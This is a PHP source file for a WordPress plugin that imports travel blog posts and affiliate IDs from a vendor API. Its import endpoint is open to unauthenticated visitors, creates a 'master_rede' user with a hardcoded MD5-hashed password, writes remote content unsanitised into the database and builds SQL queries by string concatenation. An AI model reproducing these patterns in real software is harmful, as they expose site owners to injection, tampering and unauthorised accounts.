<?php

	defined( 'ABSPATH' ) or die( 'No script kiddies please!' );
    
    add_action( 'wp_ajax_import_content', 'import_content' );
    add_action( 'wp_ajax_nopriv_import_content', 'import_content' );
    function import_content(){ 
    	global $wpdb;

		$getUser = $wpdb->get_results( "SELECT * FROM wp_users WHERE user_login = 'master_rede'");
		if(empty($getUser) || $getUser == null || $getUser == "null"){
			$insertUser = $wpdb->insert('wp_users', array(
			    'user_login' => 'master_rede',
			    'user_pass' => MD5('4v,-f9!oo9!Q'),
			    'user_nicename' => 'master_rede',
			    'user_email' => 'sac@traveltec.com.br',
			    'user_url' => 'https://redeturistica.com.br',
			    'user_registered' => date('Y-m-d H:i:s'),
			    'user_status' => 0,
			    'display_name' => 'Rede Turística'
			));
			$getUser = $wpdb->get_results( "SELECT * FROM wp_users WHERE user_login = 'master_rede'"); 
		}

		$getUser = $wpdb->get_results( "SELECT * FROM wp_users WHERE user_login = 'master_rede'");
		$userId = $getUser[0]->ID;
		
		/**********************************************************************************************/

		$curl = curl_init();

		curl_setopt_array($curl, array(
  			CURLOPT_URL => "https://api.traveltec.com.br/project/public/api/w4travel/data/".$userId,
  			CURLOPT_RETURNTRANSFER => true,
  			CURLOPT_ENCODING => "",
  			CURLOPT_MAXREDIRS => 10,
  			CURLOPT_TIMEOUT => 90,
  			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  			CURLOPT_CUSTOMREQUEST => "GET",
  			CURLOPT_HTTPHEADER => array(
    			"cache-control: no-cache"
  			),
		));

		$response = curl_exec($curl);
		$err = curl_error($curl);

		curl_close($curl);

		if ($err) {
		  	echo json_encode(array("status" => 0, "message" => "Não foi possível recuperar os posts. Tente novamente."));
		} else {
			$resposta = json_decode($response, true);
			if(empty($resposta["posts"]) || $resposta["posts"] == null || $resposta["posts"] == "null"){
				echo json_encode(array("status" => 0, "message" => "Não foi possível cadastrar os posts. Tente novamente."));
			}else{ 

				/* CATEGORIAS */
				if(!empty($resposta["categories"]) || $resposta["categories"] != null || $resposta["categories"] != "null"){
					$categories = $resposta["categories"];
					for($i=0; $i<count($categories); $i++){  
						$categoryTitle = $categories[$i]["name"];
						$getCategory = $wpdb->get_results( "SELECT * FROM wp_terms WHERE name = '".$categoryTitle."'");
						if(empty($getCategory[0]) || $getCategory[0] == null || $getCategory[0] == "null"){
							$insertCategories[] = $wpdb->insert('wp_terms', array(
							    'term_id' => $categories[$i]["id"],
							    'name' => $categories[$i]["name"],
							    'slug' => $categories[$i]["slug"],
							    'term_group' => $categories[$i]["term_group"]
							));
 
							$getCategoryTaxonomy = $wpdb->get_results( "SELECT * FROM wp_term_taxonomy WHERE term_id = ".$categories[$i]["id"]);
							if(empty($getCategoryTaxonomy[0]) || $getCategoryTaxonomy[0] == null || $getCategoryTaxonomy[0] == "null"){
								$insertCategoriesTaxonomy[] = $wpdb->insert('wp_term_taxonomy', array(
								    'term_id' => $categories[$i]["id"],
								    'taxonomy' => 'category',
								    'parent' => 0,
								    'count' => $categories[$i]["count"]
								));
							}
						}
					}
				}
				/* CATEGORIAS */

				/* TAGS */
				if(!empty($resposta["tags"]) || $resposta["tags"] != null || $resposta["tags"] != "null"){
					$tags = $resposta["tags"];
					for($i=0; $i<count($tags); $i++){  
						$tagTitle = $tags[$i]["name"];
						$getTag = $wpdb->get_results( "SELECT * FROM wp_terms WHERE name = '".$tagTitle."'");
						if(empty($getTag[0]) || $getTag[0] == null || $getTag[0] == "null"){
							$insertTags[] = $wpdb->insert('wp_terms', array(
							    'term_id' => $tags[$i]["id"],
							    'name' => $tags[$i]["name"],
							    'slug' => $tags[$i]["slug"],
							    'term_group' => $tags[$i]["term_group"]
							));
 
							$getTagTaxonomy = $wpdb->get_results( "SELECT * FROM wp_term_taxonomy WHERE term_id = ".$tags[$i]["id"]);
							if(empty($getTagTaxonomy[0]) || $getTagTaxonomy[0] == null || $getTagTaxonomy[0] == "null"){
								$insertTagTaxonomy[] = $wpdb->insert('wp_term_taxonomy', array(
								    'term_id' => $tags[$i]["id"],
								    'taxonomy' => 'post_tag',
								    'parent' => 0,
								    'count' => $tags[$i]["count"]
								));
							}
						}
					}
				}
				/* TAGS */

				/* POSTS */
				if(!empty($resposta["posts"]) || $resposta["posts"] != null || $resposta["posts"] != "null"){
					$posts = $resposta["posts"];
					$setCategoryPost = $resposta["categories_posts"];
					$setTagPost = $resposta["tags_posts"];
					for($i=0; $i<count($posts); $i++){  

						if(!empty(trim(get_option( 'setValueAfiliadoBooking' )))){
							$posts[$i]["post_content"] = str_replace("aid={IdAfBooking}", "aid=".get_option('setValueAfiliadoBooking'), $posts[$i]["post_content"]);
						}
						if(!empty(trim(get_option( 'setValueAfiliadoPromoPassagens' )))){
							$posts[$i]["post_content"] = str_replace("pcrid={IdAfPromo}", "pcrid=".get_option('setValueAfiliadoPromoPassagens'), $posts[$i]["post_content"]);
						}else if(!empty(trim(get_option( 'setValueAfiliadoPromoSeguroViagem' )))){
							$posts[$i]["post_content"] = str_replace("pcrid={IdAfPromo}", "pcrid=".get_option('setValueAfiliadoPromoSeguroViagem'), $posts[$i]["post_content"]);
						}
						if(!empty(trim(get_option( 'setValueAfiliadoViatorPasseios' )))){
							$posts[$i]["post_content"] = str_replace('data-vi-partner-id="{IdAfViator}"', 'data-vi-partner-id="'.get_option('setValueAfiliadoViatorPasseios').'"', $posts[$i]["post_content"]);
							$posts[$i]["post_content"] = str_replace('{scriptViator}', '<script async="" src="https://www.viator.com/orion/partner/widget.js"></script>', $posts[$i]["post_content"]);
						}else{
							$posts[$i]["post_content"] = str_replace('{scriptViator}', '', $posts[$i]["post_content"]);
						}

						$postTitle = $posts[$i]["post_title"];
						$getPost = $wpdb->get_results( "SELECT * FROM wp_posts WHERE post_title = '".$postTitle."' AND post_author = ".$userId);
						if(empty($getPost[0]) || $getPost[0] == null || $getPost[0] == "null"){
							$insertPosts[] = $wpdb->insert('wp_posts', $posts[$i]);
						}else{
							$updatePosts[] = $wpdb->update('wp_posts', $posts[$i], array('id' => $getPost[0]->ID));  
						}
						$getPost = $wpdb->get_results( "SELECT * FROM wp_posts WHERE post_title = '".$postTitle."' AND post_author = ".$userId);
						if(!empty($setCategoryPost[$i]) || $setCategoryPost[$i] != null || $setCategoryPost[$i] != "null"){
							for($x=0; $x<count($setCategoryPost[$i]); $x++){
								$getCategoryTaxonomy = $wpdb->get_results( "SELECT * FROM wp_term_taxonomy WHERE term_id = ".$setCategoryPost[$i][$x]);
								$getCategoryTaxonomyRelationship = $wpdb->get_results( "SELECT * FROM wp_term_relationships WHERE object_id = ".$getPost[0]->ID." AND term_taxonomy_id = ".$getCategoryTaxonomy[0]->term_taxonomy_id);
								if((!empty($getCategoryTaxonomy[0]) || $getCategoryTaxonomy[0] != null || $getCategoryTaxonomy[0] != "null") && (empty($getCategoryTaxonomyRelationship[0]) || $getCategoryTaxonomyRelationship[0] == null || $getCategoryTaxonomyRelationship[0] == "null")){
									$insertCategoryRelationship[] = $wpdb->insert('wp_term_relationships', array(
									    'object_id' => $getPost[0]->ID,
									    'term_taxonomy_id' => $getCategoryTaxonomy[0]->term_taxonomy_id
									));
								}
							}
						}
						if(!empty($setTagPost[$i]) || $setTagPost[$i] != null || $setTagPost[$i] != "null"){
							for($y=0; $y<count($setTagPost[$i]); $y++){
								$getTagTaxonomy = $wpdb->get_results( "SELECT * FROM wp_term_taxonomy WHERE term_id = ".$setTagPost[$i][$y]);
								$getTagTaxonomyRelationship = $wpdb->get_results( "SELECT * FROM wp_term_relationships WHERE object_id = ".$getPost[0]->ID." AND term_taxonomy_id = ".$getTagTaxonomy[0]->term_taxonomy_id);
								if((!empty($getTagTaxonomy[0]) || $getTagTaxonomy[0] != null || $getTagTaxonomy[0] != "null") && (empty($getTagTaxonomyRelationship[0]) || $getTagTaxonomyRelationship[0] == null || $getTagTaxonomyRelationship[0] == "null")){
									$insertTagRelationship[] = $wpdb->insert('wp_term_relationships', array(
									    'object_id' => $getPost[0]->ID,
									    'term_taxonomy_id' => $getTagTaxonomy[0]->term_taxonomy_id
									));
								}
							}
						}
					}
				}
				/* POSTS */
 
				$check_page_exist = get_page_by_title('Cotação de Viagens', 'OBJECT', 'page');

		        if(empty($check_page_exist)) {
		            $wpdb->insert('wp_posts', array(
		                'comment_status' => 'close',
		                'ping_status'    => 'close',
		                'post_author'    => 1,
		                'post_title'     => ucwords('Cotação de Viagens'),
		                'post_name'      => 'formulario-de-cotacao',
		                'post_status'    => 'publish',
		                'post_content'   => '[VOUCHERTEC_FORMULARIO_COTACAO]',
		                'post_type'      => 'page'
		            ));
		        }
 
				$check_page_exist = get_page_by_title('Obrigado', 'OBJECT', 'page');

		        if(empty($check_page_exist)) {
		            $wpdb->insert('wp_posts', array(
		                'comment_status' => 'close',
		                'ping_status'    => 'close',
		                'post_author'    => 1,
		                'post_title'     => ucwords('Obrigado'),
		                'post_name'      => 'obrigado',
		                'post_status'    => 'publish',
		                'post_content'   => '<h4>Agradecemos o seu contato!</h4>Agora é só aguardar. Em breve retornaremos a sua solicitação.',
		                'post_type'      => 'page'
		            ));
		        }

		  		echo json_encode(array("status" => 1, "message" => "Conteúdo importado com sucesso. Aproveite!"));
		  	}
		}
    }  

  	add_action( 'wp_ajax_get_data_afiliate', 'get_data_afiliate' );
    add_action( 'wp_ajax_nopriv_get_data_afiliate', 'get_data_afiliate' );
    function get_data_afiliate(){  

    	$idAfiliateBooking = 0;
    	$idAfiliatePromo = 0;
    	$idAfiliateViator = 0;
    	if(!empty(trim(get_option( 'setValueAfiliadoBooking' )))){
			$idAfiliateBooking = get_option('setValueAfiliadoBooking');
		}

		if(!empty(trim(get_option( 'setValueAfiliadoPromoPassagens' ))) || !empty(trim(get_option( 'setValueAfiliadoPromoSeguroViagem' )))){
			$idAfiliatePromo = (get_option( 'setValueAfiliadoPromoPassagens' ) ? get_option( 'setValueAfiliadoPromoPassagens' ) : get_option('setValueAfiliadoPromoSeguroViagem'));
		}

		if(!empty(trim(get_option( 'setValueAfiliadoViatorPasseios' )))){
			$idAfiliateViator = get_option('setValueAfiliadoViatorPasseios');
		}

		$retorno = array("afiliateBooking" => $idAfiliateBooking, "afiliatePromo" => $idAfiliatePromo, "afiliateViator" => $idAfiliateViator);
		echo json_encode($retorno);

    }

?>